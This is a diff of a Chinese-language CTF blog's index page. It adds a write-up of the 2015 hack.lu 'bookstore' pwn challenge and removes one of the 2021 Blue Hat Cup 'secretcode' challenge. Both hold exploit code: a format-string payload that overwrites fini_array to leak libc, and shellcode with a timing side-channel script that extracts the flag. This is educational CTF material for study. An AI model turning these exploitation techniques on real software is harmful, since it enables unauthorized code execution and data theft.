@@ -155,6 +155,102 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/10/2015-hacklu-bookstore/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/10/2015-hacklu-bookstore/" class="post-title-link" itemprop="url">2015-hacklu-bookstore</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-10 18:03:18" itemprop="dateCreated datePublished" datetime="2022-05-10T18:03:18+08:00">2022-05-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-11 00:51:22" itemprop="dateModified" datetime="2022-05-11T00:51:22+08:00">2022-05-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>回顾一下fini_array的内容，值得注意的是fini_array在RELRO半开的时候就不可写了，所以其只能利用在RELRO全关的情况下。因为一般题目都不会把RELRO全关的，所以看到一个全关的情况或许能往这方面想一下。</p>
+<p>这题的难点主要在于控制格式化字符串的过程，要想到利用最后的向v5指向的chunk里复制内容的函数来控制格式化字符串，以及这个具体的步骤。其实回过来想每一步都感觉挺合理的，“因为某种方式必定走不通所以只能是那种方式”的这种思维。</p>
+<p>unsorted bin不像fast bin，从unsorted bin中取出chunk时不会有所检查，所以可以选择先将某个chunk free到unsorted bin中，再去改它的size位，有时能比较省事</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>main函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 || !v7 || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; _____          _   _                 _          _                   _ \n&quot;</span></span><br><span class="line">    <span class="string">&quot;/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / /\\/ _ \\ \\/ / __| &#x27;_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| &#x27;__/ _ \\/  /\n&quot;</span></span><br><span class="line">    <span class="string">&quot; / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n&quot;</span></span><br><span class="line">    <span class="string">&quot; \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Crappiest and most expensive books for your college education!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We can order books for you in case they&#x27;re not in stock.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Max. two orders allowed!\n&quot;</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Edit order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Edit order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Delete order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Delete order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5: Submit&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">        edit(v6);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">        edit(v7);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        v5 = <span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sub_400937(v5, v6, v7);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>edit函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    v1 = v3++;</span><br><span class="line">    *(v1 + a1) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  *(v3 - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以及选择’5‘之后会调用的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400937</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a2, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(a1, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a3, v4);</span><br><span class="line">  *&amp;a1[<span class="built_in">strlen</span>(a1)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数的功能就是拷贝v6和v7所指向的chunk中的内容到v5所指向的chunk中，v5最后用于输出。</p>
+<p>程序的逻辑很简单，先按顺序申请出chunk1、chunk2（v6、v7所对应的chunk）以及dest三个块，大小都为0x90。并且可以任意编辑chunk1跟chunk2中的内容。</p>
+<p>总的来说本题的三个漏洞点为：① edit函数中的任意长度堆溢出。② delete中的uaf。③ main函数末尾的格式化字符串。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先我们可以确定的一点是程序中可以用来泄漏的一个点只有格式化字符串，但是因为格式化字符串之后main函数就返回了，所以我们肯定还得用某种方式让程序再返回到我们希望的地方，那么这里我们一般就会想到修改fini_array0为main_addr来实现，由于没开启PIE，所以这个思路是可行的。</p>
+<h4 id="一、格式化字符串的构造"><a href="#一、格式化字符串的构造" class="headerlink" title="一、格式化字符串的构造"></a>一、格式化字符串的构造</h4><p>那么我们第一步就是思考怎么构造这个格式化字符串，因为其参数是dest，而且我们每次edit完之后都会调用strcpy来往dest中写入字符串，而strcpy函数会在最后补一个结束符，所以就算我们能利用堆溢出修改dest中的内容也没用，最后会被截断。</p>
+<p>那么显然我们就只能靠<code>sub_400937()</code>函数了，因为在这个函数里其会将chunk1和chunk2的内容拷贝到v5对应的数组中，而v5对应的chunk是在我们选择了’5’之后再申请的，也就是说我们可以让v5跟dest堆重叠来控制dest中的内容。</p>
+<p>但是dest不能直接被free掉，所以只能让v5跟chunk2重叠，然后覆盖掉dest。</p>
+<p>这里既然要让v5跟chunk2重叠，那么就要通过chunk1去改掉chunk2的size，但是因为改掉size之后free掉这个chunk时还要过glibc的检测，所以很麻烦，所以我们可以选择<strong>先把chunk2 free掉，再把它的size盖掉</strong>，这样就减少了要伪造的数据，而且其从unsorted bin中被取出的时候也不会对这个chunk有所检查。</p>
+<p>接下来我们就要在chunk1里面构造格式化字符串，同时要有一段padding保证在chunk1跟chunk2复制完到v5之后，格式化字符串的本体出现在dest中。</p>
+<p>这一部分要描述太麻烦了，但是其实并不是很难，稍微计算下padding即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">free2()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%63c%15$hn%2553c%14$hn&#x27;</span> + <span class="string">&#x27;%31$p&#x27;</span>	<span class="comment">#chunk1 start</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x6c</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">edit1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x151</span>))</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;5&#x27;</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">15</span> + p64(fini_array) + p64(fini_array+<span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">system = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7a2d840</span> - <span class="number">0x7ffff7a523a0</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system = &quot;</span>,<span class="built_in">hex</span>(system)</span><br></pre></td></tr></table></figure>
+
+<p>到这里为止我们完成了libc的泄漏并返回到main函数</p>
+<h4 id="二、劫持"><a href="#二、劫持" class="headerlink" title="二、劫持"></a>二、劫持</h4><p>到这里这题其实就没有难点了，感觉还是用格式化字符串简单点，所以我在前面那步多泄漏了个栈地址，然后返回地址改one_gadget就行了，这一部分很简单就不贴exp了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1449,96 +1545,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/" class="post-title-link" itemprop="url">2021蓝帽杯决赛-secretcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-09 16:40:11" itemprop="dateCreated datePublished" datetime="2022-03-09T16:40:11+08:00">2022-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-12 23:51:18" itemprop="dateModified" datetime="2022-03-12T23:51:18+08:00">2022-03-12</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h5 id="侧信道攻击的概念"><a href="#侧信道攻击的概念" class="headerlink" title="侧信道攻击的概念"></a>侧信道攻击的概念</h5><blockquote>
-<p>侧信道信息一般分成：声音、温度、功耗、电磁、色彩、等，在加密硬件进行加密的时候，上述的信息只是加密过程中附带产生的物理量，这列物理量不会对加密提供任何好处，攻击利用收集到的这些物理信息，通过结合统计学手段，或者其他算法揭秘硬件上使用的秘钥。这些利用物理量达到破解秘钥的方法就叫做侧信道攻击。 </p>
-</blockquote>
-<p>我的理解是侧信道攻击就是通过对一些加密信息本身以外的信息来进行分析，从而得到我们想要的加密信息本身的攻击方式，这一块算是一些别的知识拓展，对做题本身而言没有帮助</p>
-<h5 id="二分法算法"><a href="#二分法算法" class="headerlink" title="二分法算法"></a>二分法算法</h5><p>下面题目中的exp利用了二分法来缩短爆破的时间及次数，当然其实也可以用jz来遍历爆破，但我觉得是一种很棒的思路，结合下面题目来看</p>
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>参考了wjh师傅的<a target="_blank" rel="noopener" href="http://wjh-blog.test.upcdn.net/archives/479/">第五届 “蓝帽杯” Final PWN、RE Writeup</a>，他用二分法来编写shellcode以此缩短爆破的时间和次数</p>
-<p>保护如下</p>
-<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/checksec.png" class>
-
-<p>程序主逻辑</p>
-<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/main.png" class>
-
-<p>沙箱规则如下</p>
-<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/seccomp.jpg" class>
-
-<p>可见只能调用open和read，同时要求调用read时的文件描述符不小于14，所以我们没办法二次读入一段shellcode</p>
-<p>综上我们就需要输入一段大小在 0x40 字节以内，且中间不包含’\x00’的shellcode，同时因为我们只能调用open和read，所以需要用侧信道攻击来得到flag</p>
-<p>让open的返回值（rax）与 0x14 进行比较，不等于则继续open，直到fd不小于14后再进行read，将flag读到栈上，再根据ja指令来判断flag的某位（i）是否大于某个值（mid）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	open:</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi,rsp</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	push 0x2</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	cmp rax,0x14</span></span><br><span class="line"><span class="string">	jnz open</span></span><br><span class="line"><span class="string">	mov rdi,rax</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	mov dl,0xff</span></span><br><span class="line"><span class="string">	mov rsi,rsp</span></span><br><span class="line"><span class="string">	xor rax,rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov al,[rsp + %d]</span></span><br><span class="line"><span class="string">	cmp al,%d</span></span><br><span class="line"><span class="string">	loop:</span></span><br><span class="line"><span class="string">	ja loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (i,mid)</span><br></pre></td></tr></table></figure>
-
-<p>这里设置loop是为了利用shellcode执行的时间来判断这段shellcode中是否进入了loop循环，如果进入了则说明此时比较的flag位大于mid，结合这部分我们再利用二分法来进行爆破就可以得出此时比较的flag位是什么，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x20</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">        p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">        shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			open:</span></span><br><span class="line"><span class="string">			push 0x67616c66</span></span><br><span class="line"><span class="string">			mov rdi,rsp</span></span><br><span class="line"><span class="string">			xor rsi,rsi</span></span><br><span class="line"><span class="string">			xor rdx,rdx</span></span><br><span class="line"><span class="string">			push 0x2</span></span><br><span class="line"><span class="string">			pop rax</span></span><br><span class="line"><span class="string">			syscall</span></span><br><span class="line"><span class="string">			cmp rax,0x14</span></span><br><span class="line"><span class="string">			jnz open</span></span><br><span class="line"><span class="string">			mov rdi,rax</span></span><br><span class="line"><span class="string">			xor rdx,rdx</span></span><br><span class="line"><span class="string">			mov dl,0xff</span></span><br><span class="line"><span class="string">			mov rsi,rsp</span></span><br><span class="line"><span class="string">			xor rax,rax</span></span><br><span class="line"><span class="string">			syscall</span></span><br><span class="line"><span class="string">			mov al,[rsp + %d]</span></span><br><span class="line"><span class="string">			cmp al,%d</span></span><br><span class="line"><span class="string">			loop:</span></span><br><span class="line"><span class="string">			ja loop</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span> % (i,mid)</span><br><span class="line">        p.send(shellcode)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.recv(timeout = <span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">0.05</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        p.close()</span><br><span class="line">    flag += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span> : <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
